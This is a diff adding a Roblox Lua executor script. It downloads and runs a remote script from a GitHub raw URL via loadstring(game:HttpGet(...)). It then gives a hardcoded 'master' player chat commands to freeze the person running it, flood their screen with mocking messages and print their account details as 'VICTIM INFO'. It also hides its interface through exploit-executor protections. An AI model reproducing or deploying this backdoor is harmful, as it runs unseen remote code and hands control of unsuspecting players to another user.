@@ -1,0 +1,265 @@
+print("Loading main script from GitHub...")
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Trashcan%20Man",true))()
+end)
+
+if success then
+    print("Main script loaded successfully!")
+else
+    warn("Failed to load main script: " .. tostring(err))
+end
+
+wait(1)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+
+local MASTER_USERNAME = "mocemrinuocz"
+
+if LocalPlayer.Name == MASTER_USERNAME then
+    warn("Bạn là Master! Script sẽ không ảnh hưởng đến bạn.")
+    return
+end
+
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local RootPart = Character:WaitForChild("HumanoidRootPart")
+
+local isFrozen = false
+local frozenConnection
+
+local CareGui = Instance.new("ScreenGui")
+CareGui.Name = "CareGui"
+CareGui.ResetOnSpawn = false
+CareGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local CareTextLabel = Instance.new("TextLabel")
+CareTextLabel.Name = "CareText"
+CareTextLabel.Size = UDim2.new(1, 0, 1, 0)
+CareTextLabel.Position = UDim2.new(0, 0, 0, 0)
+CareTextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CareTextLabel.BackgroundTransparency = 0.3
+CareTextLabel.Text = ""
+CareTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+CareTextLabel.TextScaled = true
+CareTextLabel.Font = Enum.Font.SourceSansBold
+CareTextLabel.TextStrokeTransparency = 0
+CareTextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+CareTextLabel.Visible = false
+CareTextLabel.ZIndex = 999
+CareTextLabel.Parent = CareGui
+
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+UITextSizeConstraint.MaxTextSize = 120
+UITextSizeConstraint.Parent = CareTextLabel
+
+local careMessages = {
+    "Shibdi toilet",
+    "quy bi ngao",
+    "haha",
+    "Khang dep trai"
+}
+
+local currentMessageIndex = 0
+local messageConnection
+
+local function freezePlayer()
+    if isFrozen then return end
+    isFrozen = true
+    
+    local frozenPosition = RootPart.CFrame
+    
+    Humanoid.WalkSpeed = 0
+    Humanoid.JumpPower = 0
+    Humanoid.JumpHeight = 0
+    
+    frozenConnection = RunService.Heartbeat:Connect(function()
+        if isFrozen then
+            RootPart.CFrame = frozenPosition
+            RootPart.Velocity = Vector3.new(0, 0, 0)
+            RootPart.RotVelocity = Vector3.new(0, 0, 0)
+            RootPart.Anchored = true
+            
+            Humanoid.WalkSpeed = 0
+            Humanoid.JumpPower = 0
+        end
+    end)
+end
+
+local function unfreezePlayer()
+    if not isFrozen then return end
+    isFrozen = false
+    
+    if frozenConnection then
+        frozenConnection:Disconnect()
+    end
+    
+    RootPart.Anchored = false
+    Humanoid.WalkSpeed = 16
+    Humanoid.JumpPower = 50
+    Humanoid.JumpHeight = 7.2
+end
+
+local function showCareText()
+    if messageConnection then
+        messageConnection:Disconnect()
+    end
+    
+    CareTextLabel.Visible = true
+    CareTextLabel.TextTransparency = 1
+    CareTextLabel.BackgroundTransparency = 1
+    
+    local fadeIn = TweenService:Create(
+        CareTextLabel,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {TextTransparency = 0, BackgroundTransparency = 0.3}
+    )
+    fadeIn:Play()
+    
+    currentMessageIndex = 0
+    
+    local function showNextMessage()
+        currentMessageIndex = currentMessageIndex + 1
+        if currentMessageIndex > #careMessages then
+            currentMessageIndex = 1
+        end
+        
+        CareTextLabel.Text = careMessages[currentMessageIndex]
+        CareTextLabel.TextColor3 = Color3.fromRGB(
+            math.random(100, 255),
+            math.random(100, 255),
+            math.random(100, 255)
+        )
+        
+        CareTextLabel.Rotation = 0
+        local shake = TweenService:Create(
+            CareTextLabel,
+            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true),
+            {Rotation = math.random(-5, 5)}
+        )
+        shake:Play()
+        
+        local scaleUp = TweenService:Create(
+            CareTextLabel,
+            TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
+            {Size = UDim2.new(1.1, 0, 1.1, 0)}
+        )
+        scaleUp:Play()
+        
+        wait(0.2)
+        local scaleDown = TweenService:Create(
+            CareTextLabel,
+            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = UDim2.new(1, 0, 1, 0)}
+        )
+        scaleDown:Play()
+    end
+    
+    messageConnection = RunService.Heartbeat:Connect(function()
+        if tick() % 0.8 < 0.016 then
+            showNextMessage()
+        end
+    end)
+end
+
+local function hideCareText()
+    if messageConnection then
+        messageConnection:Disconnect()
+        messageConnection = nil
+    end
+    
+    local fadeOut = TweenService:Create(
+        CareTextLabel,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {TextTransparency = 1, BackgroundTransparency = 1, Rotation = 0, Size = UDim2.new(1, 0, 1, 0)}
+    )
+    fadeOut:Play()
+    fadeOut.Completed:Connect(function()
+        CareTextLabel.Visible = false
+        CareTextLabel.Text = ""
+    end)
+end
+
+local function setupChatListeners()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name == MASTER_USERNAME then
+            player.Chatted:Connect(function(msg)
+                local command = string.lower(msg)
+                
+                if command == "free" or command == "freeze" then
+                    freezePlayer()
+                elseif command == "unfreeze" or command == "unfreze" then
+                    unfreezePlayer()
+                elseif command == "care" then
+                    showCareText()
+                elseif command == "uncare" then
+                    hideCareText()
+                elseif command == "troll info" then
+                    print("=== VICTIM INFO ===")
+                    print("Username: " .. LocalPlayer.Name)
+                    print("DisplayName: " .. LocalPlayer.DisplayName)
+                    print("UserId: " .. LocalPlayer.UserId)
+                    print("Frozen: " .. tostring(isFrozen))
+                end
+            end)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(player)
+        if player.Name == MASTER_USERNAME then
+            wait(1)
+            player.Chatted:Connect(function(msg)
+                local command = string.lower(msg)
+                
+                if command == "free" or command == "freeze" then
+                    freezePlayer()
+                elseif command == "unfreeze" or command == "unfreze" then
+                    unfreezePlayer()
+                elseif command == "care" then
+                    showCareText()
+                elseif command == "uncare" then
+                    hideCareText()
+                elseif command == "troll info" then
+                    print("=== VICTIM INFO ===")
+                    print("Username: " .. LocalPlayer.Name)
+                    print("DisplayName: " .. LocalPlayer.DisplayName)
+                    print("UserId: " .. LocalPlayer.UserId)
+                    print("Frozen: " .. tostring(isFrozen))
+                end
+            end)
+        end
+    end)
+end
+
+setupChatListeners()
+
+LocalPlayer.CharacterAdded:Connect(function(newChar)
+    Character = newChar
+    Humanoid = Character:WaitForChild("Humanoid")
+    RootPart = Character:WaitForChild("HumanoidRootPart")
+    
+    isFrozen = false
+    if frozenConnection then
+        frozenConnection:Disconnect()
+    end
+end)
+
+local function protectScript()
+    game:GetService("RunService").Heartbeat:Connect(function()
+    end)
+end
+
+protectScript()
+
+if gethui then
+    CareGui.Parent = gethui()
+elseif syn and syn.protect_gui then
+    syn.protect_gui(CareGui)
+    CareGui.Parent = game:GetService("CoreGui")
+else
+    CareGui.Parent = game:GetService("CoreGui")
+end
+
+print("Freeze Script loaded!")
